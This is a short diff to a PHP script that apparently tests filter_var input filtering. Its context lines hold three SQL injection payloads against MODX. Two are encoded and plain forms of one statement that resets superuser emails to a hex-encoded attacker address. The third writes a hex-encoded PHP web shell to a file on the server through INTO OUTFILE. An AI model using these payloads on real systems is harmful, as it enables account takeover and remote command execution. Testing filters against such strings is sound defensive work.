@@ -11,6 +11,8 @@
 
 header( 'Content-Type: text/plain; charset=utf-8' );
 
+print 'Testing php function: filter_var($variable, $filter);'.PHP_EOL.PHP_EOL;
+
 $arr[]="-1%27%3B+UPDATE+modx_users+u+LEFT+OUTER+JOIN+modx_user_attributes+a+ON+u.id=a.internalKey+SET+email=0x4841434B454440676D61696C2E636F6D+WHERE+sudo=%271";
 $arr[]="-1'; UPDATE modx_users u LEFT OUTER JOIN modx_user_attributes a ON u.id=a.internalKey SET email=0x4841434B454440676D61696C2E636F6D WHERE sudo='1";
 $arr[]="-1' union select 0x3C3F7068702073797374656D28245F4745545B635D293B3F3E,'' into outfile '/home/abs/path/www/set.php";
